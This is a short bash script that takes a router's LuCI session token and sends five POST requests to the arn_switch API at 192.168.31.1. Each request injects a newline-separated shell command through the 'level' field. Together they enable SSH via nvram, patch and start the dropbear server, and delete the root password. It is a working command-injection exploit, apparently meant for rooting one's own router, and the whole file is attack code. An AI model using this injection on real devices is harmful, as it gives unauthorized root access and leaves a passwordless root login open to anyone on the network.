#!/usr/bin/env cached-nix-shell
#!nix-shell -i curl -i bash -p bash

if [ "$1" = "" ]; then
  echo "Usage: $0 [stok]"
  echo "e.g. $0 e6ea114ba2cddb0c70fbbc417bb2706c"
  echo "Copy the stok-string from a browser's URL-line, while being logged in to the router"
  exit 1
fi

curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=${1}/api/misystem/arn_switch" -d "open=1&model=1&level=%0Anvram%20set%20ssh_en%3D1%0A"
sleep 1
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=${1}/api/misystem/arn_switch" -d "open=1&model=1&level=%0Anvram%20commit%0A"
sleep 1
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=${1}/api/misystem/arn_switch" -d "open=1&model=1&level=%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%0A"
sleep 1
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=${1}/api/misystem/arn_switch" -d "open=1&model=1&level=%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A"
sleep 1
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=${1}/api/misystem/arn_switch" -d "open=1&model=1&level=%0Apasswd%20-d%20root%0A"
